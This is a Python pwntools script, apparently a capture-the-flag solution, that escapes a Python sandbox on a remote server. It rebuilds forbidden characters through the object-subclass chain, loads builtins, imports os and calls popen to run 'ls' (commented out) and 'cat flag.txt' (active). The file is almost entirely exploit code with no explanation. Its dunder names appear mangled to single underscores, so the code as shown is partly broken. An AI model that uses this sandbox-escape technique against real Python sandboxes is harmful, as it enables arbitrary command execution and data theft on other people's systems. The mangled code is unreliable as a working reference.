from pwn import *

p = remote("103.13.206.173",10002)

# p.sendline(f"print(()._class.base.subclasses().getitem(137).class_)")
# p.sendline("print(()._class.base.subclasses_()[104]().load_module('builtins'))")
# p.sendline("print(()._class.base.subclasses()[64](().class.base.subclasses_())[181])")
# p.sendline("print(()._class.base.subclasses()[64](().class.base.subclasses_())[22])")

#get all char
# p.sendline("charb=()._class.base.subclasses()[64](().class.base.subclasses_())[67];")
# p.sendline("charu=()._class.base.subclasses()[64](().class.base.subclasses_())[-18];")
# p.sendline("chari=()._class.base.subclasses()[64](().class.base.subclasses_())[-17];")
# p.sendline("charl=()._class.base.subclasses()[64](().class.base.subclasses_())[-16];")
# p.sendline("chart=()._class.base.subclasses()[64](().class.base.subclasses_())[-15];")
# p.sendline("charn=()._class.base.subclasses()[64](().class.base.subclasses_())[-13];")
# p.sendline("charo=()._class.base.subclasses()[64](().class.base.subclasses_())[38];")
# p.sendline("charh=()._class.base.subclasses()[64](().class.base.subclasses_())[184];")

# p.sendline("chars=()._class.base.subclasses()[64](().class.base.subclasses_())[22];")
# p.sendline("chary=()._class.base.subclasses()[64](().class.base.subclasses_())[10];")
# p.sendline("chare=()._class.base.subclasses()[64](().class.base.subclasses_())[182];")
# p.sendline("charm=()._class.base.subclasses()[64](().class.base.subclasses_())[181];")
# p.sendline("charl=()._class.base.subclasses()[64](().class.base.subclasses_())[19];")

# p.sendline("charf=()._class.base.subclasses()[64](().class.base.subclasses_())[3032];")
# p.sendline("chara=()._class.base.subclasses()[64](().class.base.subclasses_())[3842];")
# p.sendline("charg=()._class.base.subclasses()[64](().class.base.subclasses_())[1775];")
# p.sendline("charx=()._class.base.subclasses()[64](().class.base.subclasses_())[2976];")
# p.sendline("chardot=()._class.base.subclasses()[64](().class.base.subclasses_())[3845];")
# p.sendline("chardot=()._class.base.subclasses()[64](().class.base.subclasses_())[3890];")
# p.sendline("charc=()._class.base.subclasses()[64](().class.base.subclasses_())[3844];")


# ls
# p.sendline("charc=()._class.base.subclasses()[64](().class.base.subclasses())[3844];charspasi=().class.base.subclasses()[64](().class.base.subclasses())[3890];chardot=().class.base.subclasses()[64](().class.base.subclasses())[3845];charx=().class.base.subclasses()[64](().class.base.subclasses())[2976];charg=().class.base.subclasses()[64](().class.base.subclasses())[1775];chara=().class.base.subclasses()[64](().class.base.subclasses())[3842];charf=().class.base.subclasses()[64](().class.base.subclasses())[3032];charl=().class.base.subclasses()[64](().class.base.subclasses())[19];charm=().class.base.subclasses()[64](().class.base.subclasses())[181];chare=().class.base.subclasses()[64](().class.base.subclasses())[182];chary=().class.base.subclasses()[64](().class.base.subclasses())[10];charo=().class.base.subclasses()[64](().class.base.subclasses())[38];charh=().class.base.subclasses()[64](().class.base.subclasses())[184];chars=().class.base.subclasses()[64](().class.base.subclasses())[22];charn=().class.base.subclasses()[64](().class.base.subclasses())[-13];chart=().class.base.subclasses()[64](().class.base.subclasses())[-15];charl=().class.base.subclasses()[64](().class.base.subclasses())[-16];chari=().class.base.subclasses()[64](().class.base.subclasses())[-17];charu=().class.base.subclasses()[64](().class.base.subclasses())[-18];charb=().class.base.subclasses()[64](().class.base.subclasses())[67];p=().class.bases[0].subclasses()[104]().load_module(charb+charu+chari+charl+chart+chari+charn+chars).import_(charo+chars).popen(charl+chars);print(p.read())")

# cat flag
p.sendline("charc=()._class.base.subclasses()[64](().class.base.subclasses())[3844];charspasi=().class.base.subclasses()[64](().class.base.subclasses())[3890];chardot=().class.base.subclasses()[64](().class.base.subclasses())[3845];charx=().class.base.subclasses()[64](().class.base.subclasses())[2976];charg=().class.base.subclasses()[64](().class.base.subclasses())[1775];chara=().class.base.subclasses()[64](().class.base.subclasses())[3842];charf=().class.base.subclasses()[64](().class.base.subclasses())[3032];charl=().class.base.subclasses()[64](().class.base.subclasses())[19];charm=().class.base.subclasses()[64](().class.base.subclasses())[181];chare=().class.base.subclasses()[64](().class.base.subclasses())[182];chary=().class.base.subclasses()[64](().class.base.subclasses())[10];charo=().class.base.subclasses()[64](().class.base.subclasses())[38];charh=().class.base.subclasses()[64](().class.base.subclasses())[184];chars=().class.base.subclasses()[64](().class.base.subclasses())[22];charn=().class.base.subclasses()[64](().class.base.subclasses())[-13];chart=().class.base.subclasses()[64](().class.base.subclasses())[-15];charl=().class.base.subclasses()[64](().class.base.subclasses())[-16];chari=().class.base.subclasses()[64](().class.base.subclasses())[-17];charu=().class.base.subclasses()[64](().class.base.subclasses())[-18];charb=().class.base.subclasses()[64](().class.base.subclasses())[67];p=().class.bases[0].subclasses()[104]().load_module(charb+charu+chari+charl+chart+chari+charn+chars).import_(charo+chars).popen(charc+chara+chart+charspasi+charf+charl+chara+charg+chardot+chart+charx+chart);print(p.read())")